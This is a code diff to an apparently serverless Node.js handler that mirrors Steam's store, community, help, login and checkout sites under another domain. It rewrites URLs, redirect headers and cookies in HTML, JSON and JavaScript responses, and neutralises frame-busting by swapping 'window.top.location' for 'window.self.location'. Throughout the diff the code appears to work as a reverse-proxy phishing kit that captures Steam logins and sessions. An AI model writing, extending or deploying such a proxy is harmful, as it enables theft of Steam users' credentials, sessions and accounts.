@@ -58,6 +58,7 @@ module.exports = async function handler(req, res) {
     if (response.status >= 300 && response.status < 400) {
       let location = response.headers.get('location');
       if (location) {
+        // Rewrite location headers generically since it's just a redirect to a page
         location = location.replace(/https?:\/\/store\.steampowered\.com/gi, myDomain);
         location = location.replace(/https?:\/\/steamcommunity\.com/gi, myDomain);
         location = location.replace(/https?:\/\/help\.steampowered\.com/gi, myDomain);
@@ -80,55 +81,47 @@ module.exports = async function handler(req, res) {
       res.setHeader('Set-Cookie', newCookie); 
     }
 
-    if (contentType.includes('text/html')) {
+    if (contentType.includes('text/html') || contentType.includes('application/json') || contentType.includes('application/javascript')) {
       let html = await response.text();
       
+      // 1. Generic replace for store (since it's the default route, assets will route correctly to store)
       html = html.replace(/https?:\/\/store\.steampowered\.com/gi, myDomain);
-      html = html.replace(/https?:\/\/steamcommunity\.com/gi, myDomain);
-      html = html.replace(/https?:\/\/help\.steampowered\.com/gi, myDomain);
+      html = html.replace(/https?:\\\/\\\/store\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
+      html = html.replace(/store\.steampowered\.com/gi, hostName);
+      
+      // 2. SPECIFIC replace for Help pages (so /public/css etc stays original)
+      html = html.replace(/https?:\/\/help\.steampowered\.com\/en\//gi, myDomain + '/en/');
+      html = html.replace(/https?:\/\/help\.steampowered\.com\/wizard\//gi, myDomain + '/wizard/');
+      html = html.replace(/https?:\\\/\\\/help\.steampowered\.com\\\/en\\\//gi, myDomain.replace(/\//g, '\\/') + '\\/en\\/');
+      html = html.replace(/https?:\\\/\\\/help\.steampowered\.com\\\/wizard\\\//gi, myDomain.replace(/\//g, '\\/') + '\\/wizard\\/');
+      
+      // 3. SPECIFIC replace for Community pages (so /public/css stays original)
+      html = html.replace(/https?:\/\/steamcommunity\.com\/login/gi, myDomain + '/login');
+      html = html.replace(/https?:\/\/steamcommunity\.com\/profiles/gi, myDomain + '/profiles');
+      html = html.replace(/https?:\/\/steamcommunity\.com\/id/gi, myDomain + '/id');
+      html = html.replace(/https?:\/\/steamcommunity\.com\/market/gi, myDomain + '/market');
+      html = html.replace(/https?:\/\/steamcommunity\.com\/workshop/gi, myDomain + '/workshop');
+      html = html.replace(/https?:\/\/steamcommunity\.com\/discussions/gi, myDomain + '/discussions');
+      html = html.replace(/https?:\/\/steamcommunity\.com\/chat/gi, myDomain + '/chat');
+      
+      html = html.replace(/https?:\\\/\\\/steamcommunity\.com\\\/login/gi, myDomain.replace(/\//g, '\\/') + '\\/login');
+      html = html.replace(/https?:\\\/\\\/steamcommunity\.com\\\/profiles/gi, myDomain.replace(/\//g, '\\/') + '\\/profiles');
+      
+      // 4. Other domains (valve, partner, checkout, login)
       html = html.replace(/https?:\/\/www\.valvesoftware\.com/gi, myDomain);
       html = html.replace(/https?:\/\/valvesoftware\.com/gi, myDomain);
       html = html.replace(/https?:\/\/partner\.steamgames\.com/gi, myDomain + '/partner');
       html = html.replace(/https?:\/\/checkout\.steampowered\.com/gi, myDomain);
       html = html.replace(/https?:\/\/login\.steampowered\.com/gi, myDomain);
       
-      html = html.replace(/https?:\\\/\\\/store\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
-      html = html.replace(/https?:\\\/\\\/steamcommunity\.com/gi, myDomain.replace(/\//g, '\\/'));
-      html = html.replace(/https?:\\\/\\\/help\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
       html = html.replace(/https?:\\\/\\\/checkout\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
       html = html.replace(/https?:\\\/\\\/login\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
-      
-      html = html.replace(/store\.steampowered\.com/gi, hostName);
-      html = html.replace(/steamcommunity\.com/gi, hostName);
-      html = html.replace(/help\.steampowered\.com/gi, hostName);
       
       html = html.replace(/window\.top\.location/gi, "window.self.location");
       
       res.setHeader('Content-Type', contentType);
       return res.status(response.status).send(html);
     } 
-    
-    if (contentType.includes('application/json') || contentType.includes('application/javascript')) {
-        let text = await response.text();
-        text = text.replace(/https?:\/\/store\.steampowered\.com/gi, myDomain);
-        text = text.replace(/https?:\/\/steamcommunity\.com/gi, myDomain);
-        text = text.replace(/https?:\/\/help\.steampowered\.com/gi, myDomain);
-        text = text.replace(/https?:\/\/partner\.steamgames\.com/gi, myDomain + '/partner');
-        text = text.replace(/https?:\/\/www\.valvesoftware\.com/gi, myDomain);
-        text = text.replace(/https?:\/\/checkout\.steampowered\.com/gi, myDomain);
-        text = text.replace(/https?:\/\/login\.steampowered\.com/gi, myDomain);
-        
-        text = text.replace(/https?:\\\/\\\/store\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
-        text = text.replace(/https?:\\\/\\\/steamcommunity\.com/gi, myDomain.replace(/\//g, '\\/'));
-        text = text.replace(/https?:\\\/\\\/checkout\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
-        text = text.replace(/https?:\\\/\\\/login\.steampowered\.com/gi, myDomain.replace(/\//g, '\\/'));
-        
-        text = text.replace(/store\.steampowered\.com/gi, hostName);
-        text = text.replace(/steamcommunity\.com/gi, hostName);
-        
-        res.setHeader('Content-Type', contentType);
-        return res.status(response.status).send(text);
-    }
 
     const buffer = await response.arrayBuffer();
     res.setHeader('Content-Type', contentType);
